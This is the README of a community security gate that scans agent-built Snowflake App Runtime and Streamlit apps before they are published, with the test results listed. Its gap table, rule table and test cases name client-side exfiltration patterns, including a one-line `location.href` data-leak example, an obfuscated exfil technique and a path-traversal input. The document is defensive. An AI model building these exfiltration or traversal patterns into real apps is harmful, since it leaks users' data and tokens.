# sar-app-scan-gate

> Community example, not an official Snowflake product or supported feature. Test in a non-production account first.

A pre-publish gate for vibe-coded **Snowflake App Runtime (SAR)** and Streamlit apps. A Cortex
Agent builds the app, a deterministic scanner checks the code, and only a scanned, frozen copy can
become a shared URL. Nobody, the agent included, can skip the scan: the builder role has no
production privileges.

Sister project: [npm-package-scanning](https://github.com/sfc-gh-kkeller/npm-package-scanning)
decides **which packages** may enter a build. This repo decides whether **the app's own code** is
safe to share. The gate enforces blessed npm through the same `check_app.py`.

## Why

The SPCS/SAR ingress protects a lot, but on its own it does **not** stop client-side exfiltration.
Measured on a live account:

| Gap | Effect |
|---|---|
| Baseline CSP allows `'unsafe-inline'` and `'unsafe-eval'` | Injected or inline script runs |
| No `form-action` | A form POST can send data to any host |
| Navigation is not governed | `location.href = 'https://x/?d=…'` carries data out (~8 KB) |
| A runtime EAI is copied into the browser CSP | A `0.0.0.0` rule means `connect-src https:` |
| `Set-Cookie Domain=.snowflakecomputing.app` passes through | Cookie is shared with every app on that domain |
| The caller token reaches the app | Logging request headers leaks a usable token |

These are code properties, so the gate checks the code before a shared URL exists.

## How it works

```mermaid
flowchart TB
  U[User: Snowflake Intelligence / SQL] --> A[RUN_GATE_AGENT<br/>caller's rights = SAR_GATE_BUILDER]
  A -->|Cortex sandbox: PUT| IN[(@INBOX/&lt;user&gt;/app)]
  A -->|CALL SUBMIT_SCAN| S[Scanner job — no egress<br/>owner = SAR_GATE_ADMIN]
  IN --> S
  S -->|exact bytes scanned| FZ[(@FROZEN/&lt;digest&gt;)<br/>builder cannot write]
  S --> V{verdict}
  V -->|REWRITE| RW[APPLY_REWRITE: one safe pass<br/>new digest, rescan]
  RW --> V
  V -->|PASS| AI[AI_COMPLETE advisory<br/>can only tighten PASS→HOLD]
  AI -->|still PASS| P[REQUEST_PUBLISH<br/>owner = SAR_GATE_PUBLISH]
  P --> PJ[Publisher job: re-hash frozen tree,<br/>own app.yml, snow app deploy]
  FZ --> PJ
  PJ --> PROD[SAR_GATE.PROD.app<br/>+ GRANT USAGE to consumers]
  V -->|REFUSE / HOLD| X[not published]
```

| Verdict | Meaning | What happens |
|---|---|---|
| **PASS** | No blocking findings, and the AI advisory didn't object | `REQUEST_PUBLISH` deploys |
| **REWRITE** | Only safe-to-fix findings | `APPLY_REWRITE` once, then rescan |
| **HOLD** | WARN findings, or the AI advisory flagged it | A human reviews; no auto-publish |
| **REFUSE** | At least one REFUSE finding | Never published; fix the code and submit again |

### Why it is a cage, not a prompt

- **The builder has no prod privileges.** Publishing works only through an owner's-rights
  procedure owned by `SAR_GATE_PUBLISH`, and it refuses anything except the caller's own PASS scan.
- **Scan and publish see the same bytes.** The scanner copies the inbox to local disk, scans that
  copy, and freezes it under its SHA-256 digest. The builder cannot write `@FROZEN`. The publisher
  re-hashes the frozen tree and aborts on any mismatch.
- **The publisher writes its own `app.yml`.** Only `install`/`build`/`run`/`ignore`/display fields
  are kept. Database, schema, warehouse and build location are forced. EAIs, secrets and
  `execute_as_role` are dropped.
- **The AI can only tighten.** `AI_COMPLETE` runs on PASS scans. MALICIOUS or SUSPICIOUS above a
  confidence threshold turns PASS into HOLD. Nothing it says can turn REFUSE into PASS.
- **The agent is just the builder.** `RUN_GATE_AGENT` is caller's rights, so the Cortex sandbox has
  exactly the builder's power. Telling it "skip the scan" achieves nothing.

## What the scanner checks

**38 Semgrep rules** (`rules/`), plus Python checks in `scanner/gate.py`:

| Area | Examples | Class |
|---|---|---|
| Client | `eval`/`new Function`, `document.write`, `innerHTML`/`dangerouslySetInnerHTML`/`v-html`, inline `<script>`/`on*=`, `javascript:` URLs, `form.action`/external `<form>`, `location.*`/`window.open` to external or computed URLs, absolute-URL `fetch`/WebSocket/EventSource/XHR, WebRTC | REFUSE |
| Client | `sendBeacon`, tracking pixels, external `<script src>`, `document.cookie` with `Domain=` | REWRITE |
| Server | reflected XSS (taint: request → response), `child_process`/`subprocess`, outbound HTTP to hard-coded hosts, CORS reflecting `Origin`, redirects to external URLs | REFUSE |
| Server | logging request headers / the caller token, `Set-Cookie Domain=` | REWRITE |
| Server | global state shared across users, logging result rows, wildcard CORS, computed redirects, SQL `COPY INTO @`/`PUT` | WARN |
| Streamlit | `unsafe_allow_html=True` | REWRITE |
| Streamlit | `link_button` with a computed URL | REFUSE |
| Streamlit | `st.html`/`components.html`/`components.v2`, external links | WARN |
| Manifest | missing manifest, `execute_as_role` = ACCOUNTADMIN/SYSADMIN/…, unapproved `build_eai` | REFUSE |
| Manifest | unapproved runtime EAI | REWRITE (removed) |
| Secrets | private keys, Snowflake passwords/tokens/PATs, npm tokens, `.env`/`connections.toml`/`*.p8` files | REFUSE |
| Packages | `.npmrc`/lockfile resolving outside the blessed registry, git/file/url dependencies, no lockfile | REFUSE |

## Results

### Offline: 29/29 fixtures (`tests/run_tests.py`)

- 25 bad fixtures, one per risk, each with the exact rules it must trigger. They include the
  XSS/exfil payloads that ran against the SAR ingress, and protocol-relative `//evil.host` navigation.
- 4 clean fixtures (static Express app, React component, two Streamlit apps) return PASS. A Streamlit
  app with an external docs link returns HOLD, as designed.
- Each of the 6 REWRITE fixtures goes rewrite → rescan and must come back PASS.
- `tests/test_job_image.sh` runs the scanner image with `--network none`. It covers:
  - scan → REWRITE;
  - rewrite → PASS;
  - a path-escape attempt → ERROR;
  - the publisher's re-hash of the frozen rewrite tree matching the recorded digest.

### In Snowflake (2026-10-08, AWS test account, test users with role-restricted PATs)

| # | Case | Result |
|---|---|---|
| 1 | Form-exfil app | **REFUSE**; `REQUEST_PUBLISH` refused |
| 2 | External tracker `<script src>` | **REWRITE** → `APPLY_REWRITE` → **PASS** → published. The consumer gets the page with the tag removed. Publishing the REWRITE scan directly was refused, and a 2nd rewrite pass was refused |
| 3 | TOCTOU: clean scan, malicious `server.js` uploaded afterwards | Builder `PUT` to `@FROZEN`: not authorized. The published app serves the **scanned** code |
| 4 | Obfuscated exfil (`["loc","ation"].join("")`, base64 URL, delayed `href`) | **Rules: PASS** (missed). **AI advisory: MALICIOUS, confidence 1.0**, with step-by-step evidence → **HOLD**, publish refused |
| 5 | Publish a scan id that isn't yours | Refused |
| 6 | Builder calls `CREATE APPLICATION SERVICE` in prod directly | Not authorized |
| 7 | Path traversal in `SUBMIT_SCAN` (`../other_user/x`) | Rejected by input validation |
| 8 | **Agent:** "build a clock app and publish it", as the builder | The Cortex sandbox built, uploaded, scanned (PASS, AI BENIGN) and published. Consumer **200**; builder **403** on the app |

Case 4 is why the AI step exists: the deterministic rules are the floor, and the model catches what
they miss. It can only make the result stricter.

## Layout

| Path | What |
|---|---|
| `rules/client.yml`, `server.yml`, `streamlit.yml` | Semgrep rules; `metadata.gate_class` = REFUSE / REWRITE / WARN |
| `scanner/gate.py` | Scan a tree: manifest, secrets, packages, Semgrep → verdict + digest |
| `scanner/rewrite.py` | Safe transforms only, writes a diff; the caller must rescan |
| `scanner/check_app.py` | Blessed-npm provenance check (vendored from npm-package-scanning) |
| `scanner/job.py`, `Dockerfile` | SPCS job: copy → scan → freeze; rewrite mode |
| `publisher/publish.py`, `Dockerfile` | Re-hash frozen tree, own `app.yml`, `snow app deploy`, `GRANT USAGE` |
| `sql/01_setup.sql` | Roles, schemas, stages (`INBOX`/`FROZEN`/`RESULTS`), tables, views, test users |
| `sql/02_procs.sql` | `SUBMIT_SCAN`, `APPLY_REWRITE`, `REQUEST_PUBLISH`, AI advisory, config |
| `sql/03_agent.sql` | `RUN_GATE_AGENT` (caller's rights, inline `code_toolset_all`) |
| `agent/SKILL.md` | Agent instructions: build → upload → scan → rewrite/publish |
| `tests/` | Fixtures, offline runner, job-image test, e2e script |

## Setup

```bash
# 1. objects + test users (edit the warehouse and the test IP first)
snow sql -f sql/01_setup.sql -c <conn>

# 2. images
REPO=$(snow spcs image-repository url SAR_GATE.CORE.IMAGES -c <conn>)
snow spcs image-registry login -c <conn>
docker build --platform linux/amd64 -f scanner/Dockerfile   -t $REPO/sar-gate-scanner:latest .
docker build --platform linux/amd64 -f publisher/Dockerfile -t $REPO/sar-gate-publisher:latest .
docker push $REPO/sar-gate-scanner:latest && docker push $REPO/sar-gate-publisher:latest

# 3. procedures + agent
snow sql -f sql/02_procs.sql -c <conn>
snow sql -f sql/03_agent.sql -c <conn>
snow sql -c <conn> -q "USE ROLE SAR_GATE_ADMIN; PUT file://agent/SKILL.md @SAR_GATE.CORE.SKILLS/sar-gate-publisher/ AUTO_COMPRESS=FALSE OVERWRITE=TRUE"

# 4. optional: enforce blessed npm
snow sql -c <conn> -q "UPDATE SAR_GATE.CORE.GATE_CONFIG SET value='http://<registry dns>:4873/' WHERE key='BLESSED_REGISTRY'"
```

Use it, as a builder:

```sql
CALL SAR_GATE.CORE.RUN_GATE_AGENT('Build a page that shows ... and publish it');
-- or manually: PUT files to @SAR_GATE.CORE.INBOX/<CURRENT_USER()>/<app>/ then
CALL SAR_GATE.CORE.SUBMIT_SCAN('MY_APP', 'my_app');
CALL SAR_GATE.CORE.REQUEST_PUBLISH('<scan_id>');
SELECT * FROM SAR_GATE.CORE.MY_SCANS ORDER BY submitted_at DESC;
```

Run the tests:

```bash
uv venv .venv && uv pip install --python .venv/bin/python "semgrep==1.180.0" pyyaml
PATH=$PWD/.venv/bin:$PATH python tests/make_fixtures.py && python tests/run_tests.py
docker build --platform linux/amd64 -f scanner/Dockerfile -t sar-gate-scanner:test . && tests/test_job_image.sh
```

## Limits — say these out loud

- **Pattern rules miss things.** The AI advisory caught the obfuscated case, but it is probabilistic,
  and an attacker who can iterate against it may get past it. Treat PASS as "no known issues", not
  "safe".
- **Only what's in the tree is scanned.** Data the app fetches at runtime and behaviour that depends
  on data are out of scope. Runtime detection is a separate control (SPCS runtime monitoring).
- **Caller's-rights apps** can still read whatever the consumer is allowed to read. The gate stops
  sending it off-site in code; it does not shrink grants.
- **Users with other paths** can bypass the gate, for example `snow app deploy` into their own
  personal database, or Snowsight. Their apps stay owner-only, because only `SAR_GATE_PUBLISH`
  can grant USAGE in prod. Keep `CREATE APPLICATION SERVICE` on shared schemas away from everyone else.
- **Not tested:** Next.js-sized apps with many dependencies through blessed npm (the gate check works,
  but the full build wasn't exercised here), and Streamlit publishing (the scanner covers Streamlit,
  but the publisher deploys SAR apps only).
- **Account-wide hardening is not done here.** For example, `ALLOW_NPM_PACKAGE_DOWNLOAD = FALSE` and
  keeping BIND off PUBLIC are outside this repo.

## Cleanup

```sql
DROP DATABASE SAR_GATE;            -- stages, tables, procs, prod apps, repos
DROP COMPUTE POOL SAR_GATE_POOL;
DROP USER SAR_GATE_BUILDER_U; DROP USER SAR_GATE_CONSUMER_U;
DROP NETWORK POLICY SAR_GATE_TEST_NP;
DROP ROLE SAR_GATE_BUILDER; DROP ROLE SAR_GATE_CONSUMER; DROP ROLE SAR_GATE_PUBLISH; DROP ROLE SAR_GATE_ADMIN;
```
